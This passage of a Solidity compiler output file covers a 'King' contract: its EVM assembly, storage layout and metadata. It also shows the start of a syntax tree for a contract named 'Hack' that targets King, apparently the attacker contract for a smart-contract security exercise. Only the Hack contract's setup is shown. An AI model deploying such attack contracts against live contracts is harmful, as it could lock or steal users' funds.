											"end": 758,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 741,
											"end": 758,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 741,
											"end": 758,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 741,
											"end": 758,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 741,
											"end": 758,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 741,
											"end": 758,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 741,
											"end": 758,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 741,
											"end": 758,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 741,
											"end": 758,
											"name": "OR",
											"source": 0
										},
										{
											"begin": 741,
											"end": 758,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 741,
											"end": 758,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 741,
											"end": 758,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 773,
											"end": 782,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 765,
											"end": 770,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 765,
											"end": 782,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 765,
											"end": 782,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 765,
											"end": 782,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 765,
											"end": 782,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 414,
											"end": 868,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 414,
											"end": 868,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 414,
											"end": 868,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 414,
											"end": 868,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 414,
											"end": 868,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 414,
											"end": 868,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 794,
											"end": 865,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 794,
											"end": 865,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 794,
											"end": 865,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 794,
											"end": 865,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 794,
											"end": 865,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 794,
											"end": 865,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 794,
											"end": 865,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 794,
											"end": 865,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 794,
											"end": 865,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 794,
											"end": 865,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 794,
											"end": 865,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 794,
											"end": 865,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 794,
											"end": 865,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 794,
											"end": 865,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 794,
											"end": 865,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 794,
											"end": 865,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 794,
											"end": 865,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 794,
											"end": 865,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 794,
											"end": 865,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 794,
											"end": 865,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 794,
											"end": 865,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 794,
											"end": 865,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 794,
											"end": 865,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 794,
											"end": 865,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 794,
											"end": 865,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 794,
											"end": 865,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 794,
											"end": 865,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 794,
											"end": 865,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 794,
											"end": 865,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 794,
											"end": 865,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 794,
											"end": 865,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 794,
											"end": 865,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 794,
											"end": 865,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 794,
											"end": 865,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 474,
											"end": 494,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 474,
											"end": 494,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 474,
											"end": 494,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "tag",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 474,
											"end": 494,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 474,
											"end": 494,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 474,
											"end": 494,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 474,
											"end": 494,
											"name": "tag",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 474,
											"end": 494,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 474,
											"end": 494,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 474,
											"end": 494,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 474,
											"end": 494,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 474,
											"end": 494,
											"name": "tag",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 474,
											"end": 494,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 474,
											"end": 494,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 452,
											"end": 469,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 452,
											"end": 469,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 452,
											"end": 469,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 452,
											"end": 469,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 452,
											"end": 469,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 452,
											"end": 469,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 452,
											"end": 469,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 452,
											"end": 469,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 452,
											"end": 469,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 452,
											"end": 469,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 452,
											"end": 469,
											"name": "tag",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 452,
											"end": 469,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 452,
											"end": 469,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 452,
											"end": 469,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 452,
											"end": 469,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 452,
											"end": 469,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 452,
											"end": 469,
											"name": "tag",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 452,
											"end": 469,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 452,
											"end": 469,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 452,
											"end": 469,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 452,
											"end": 469,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 452,
											"end": 469,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 452,
											"end": 469,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 452,
											"end": 469,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 452,
											"end": 469,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 452,
											"end": 469,
											"name": "tag",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 452,
											"end": 469,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 452,
											"end": 469,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 452,
											"end": 469,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 452,
											"end": 469,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 452,
											"end": 469,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 452,
											"end": 469,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 452,
											"end": 469,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 452,
											"end": 469,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 794,
											"end": 865,
											"name": "tag",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 794,
											"end": 865,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 832,
											"end": 839,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 855,
											"end": 859,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 855,
											"end": 859,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 855,
											"end": 859,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 855,
											"end": 859,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 855,
											"end": 859,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 855,
											"end": 859,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 855,
											"end": 859,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 855,
											"end": 859,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 855,
											"end": 859,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 855,
											"end": 859,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 855,
											"end": 859,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 848,
											"end": 859,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 848,
											"end": 859,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 794,
											"end": 865,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 794,
											"end": 865,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 474,
											"end": 494,
											"name": "tag",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 474,
											"end": 494,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 474,
											"end": 494,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 474,
											"end": 494,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 474,
											"end": 494,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 474,
											"end": 494,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 452,
											"end": 469,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 452,
											"end": 469,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 452,
											"end": 469,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 452,
											"end": 469,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 452,
											"end": 469,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 452,
											"end": 469,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 7,
											"end": 125,
											"name": "tag",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 7,
											"end": 125,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 94,
											"end": 118,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 112,
											"end": 117,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 94,
											"end": 118,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 94,
											"end": 118,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 94,
											"end": 118,
											"name": "tag",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 94,
											"end": 118,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 89,
											"end": 92,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 82,
											"end": 119,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 72,
											"end": 125,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 72,
											"end": 125,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 72,
											"end": 125,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 131,
											"end": 249,
											"name": "tag",
											"source": 1,
											"value": "32"
										},
										{
											"begin": 131,
											"end": 249,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 218,
											"end": 242,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 236,
											"end": 241,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 218,
											"end": 242,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 218,
											"end": 242,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 218,
											"end": 242,
											"name": "tag",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 218,
											"end": 242,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 213,
											"end": 216,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 206,
											"end": 243,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 196,
											"end": 249,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 196,
											"end": 249,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 196,
											"end": 249,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 255,
											"end": 477,
											"name": "tag",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 255,
											"end": 477,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 255,
											"end": 477,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 386,
											"end": 388,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 375,
											"end": 384,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 371,
											"end": 389,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 363,
											"end": 389,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 363,
											"end": 389,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 399,
											"end": 470,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 467,
											"end": 468,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 456,
											"end": 465,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 452,
											"end": 469,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 443,
											"end": 449,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 399,
											"end": 470,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 399,
											"end": 470,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 399,
											"end": 470,
											"name": "tag",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 399,
											"end": 470,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 353,
											"end": 477,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 353,
											"end": 477,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 353,
											"end": 477,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 353,
											"end": 477,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 353,
											"end": 477,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 483,
											"end": 705,
											"name": "tag",
											"source": 1,
											"value": "25"
										},
										{
											"begin": 483,
											"end": 705,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 483,
											"end": 705,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 614,
											"end": 616,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 603,
											"end": 612,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 599,
											"end": 617,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 591,
											"end": 617,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 591,
											"end": 617,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 627,
											"end": 698,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 695,
											"end": 696,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 684,
											"end": 693,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 680,
											"end": 697,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 671,
											"end": 677,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 627,
											"end": 698,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "32"
										},
										{
											"begin": 627,
											"end": 698,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 627,
											"end": 698,
											"name": "tag",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 627,
											"end": 698,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 581,
											"end": 705,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 581,
											"end": 705,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 581,
											"end": 705,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 581,
											"end": 705,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 581,
											"end": 705,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 711,
											"end": 807,
											"name": "tag",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 711,
											"end": 807,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 711,
											"end": 807,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 777,
											"end": 801,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 795,
											"end": 800,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 777,
											"end": 801,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 777,
											"end": 801,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 777,
											"end": 801,
											"name": "tag",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 777,
											"end": 801,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 766,
											"end": 801,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 766,
											"end": 801,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 756,
											"end": 807,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 756,
											"end": 807,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 756,
											"end": 807,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 756,
											"end": 807,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 813,
											"end": 939,
											"name": "tag",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 813,
											"end": 939,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 813,
											"end": 939,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 890,
											"end": 932,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 883,
											"end": 888,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 879,
											"end": 933,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 868,
											"end": 933,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 868,
											"end": 933,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 858,
											"end": 939,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 858,
											"end": 939,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 858,
											"end": 939,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 858,
											"end": 939,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 945,
											"end": 1022,
											"name": "tag",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 945,
											"end": 1022,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 945,
											"end": 1022,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1011,
											"end": 1016,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1000,
											"end": 1016,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1000,
											"end": 1016,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 990,
											"end": 1022,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 990,
											"end": 1022,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 990,
											"end": 1022,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 990,
											"end": 1022,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"_king()": "29cc6d6f",
							"owner()": "8da5cb5b",
							"prize()": "e3ac5d26"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.0+commit.c7dfd78e\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"_king\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"prize\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Ch10-King.sol\":\"King\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Ch10-King.sol\":{\"keccak256\":\"0xaea41b863917dd335dc69fbbf1e62050c996f8cecac4a7440d3d1f4013cc2e37\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://59f53524c78967bc2a789697aeac1471d6497b1d87b343d39b56db9870335679\",\"dweb:/ipfs/QmWe3bBvtDpn28qCiJvsUq1w5CwaALPkyGUdjowgW6p5v1\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 48,
								"contract": "contracts/Ch10-King.sol:King",
								"label": "king",
								"offset": 0,
								"slot": "0",
								"type": "t_address"
							},
							{
								"astId": 50,
								"contract": "contracts/Ch10-King.sol:King",
								"label": "prize",
								"offset": 0,
								"slot": "1",
								"type": "t_uint256"
							},
							{
								"astId": 52,
								"contract": "contracts/Ch10-King.sol:King",
								"label": "owner",
								"offset": 0,
								"slot": "2",
								"type": "t_address"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"sources": {
			"contracts/Ch10-King.sol": {
				"ast": {
					"absolutePath": "contracts/Ch10-King.sol",
					"exportedSymbols": {
						"Hack": [
							46
						],
						"King": [
							115
						]
					},
					"id": 116,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 46,
							"linearizedBaseContracts": [
								46
							],
							"name": "Hack",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 4,
									"mutability": "mutable",
									"name": "target",
									"nodeType": "VariableDeclaration",
									"scope": 46,
									"src": "80:11:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_King_$115",
										"typeString": "contract King"
									},
									"typeName": {
										"id": 3,
										"nodeType": "UserDefinedTypeName",
										"pathNode": {
											"id": 2,
											"name": "King",
											"nodeType": "IdentifierPath",
											"referencedDeclaration": 115,
											"src": "80:4:0"
										},
										"referencedDeclaration": 115,
										"src": "80:4:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_King_$115",
											"typeString": "contract King"
										}
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 15,
										"nodeType": "Block",
										"src": "149:41:0",
										"statements": [
											{
												"expression": {
													"id": 13,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 9,
														"name": "target",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 4,
														"src": "160:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_King_$115",
															"typeString": "contract King"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"arguments": [
															{
																"id": 11,
																"name": "_target",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 6,
																"src": "174:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															],
															"id": 10,
															"name": "King",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 115,
															"src": "169:4:0",
															"typeDescriptions": {
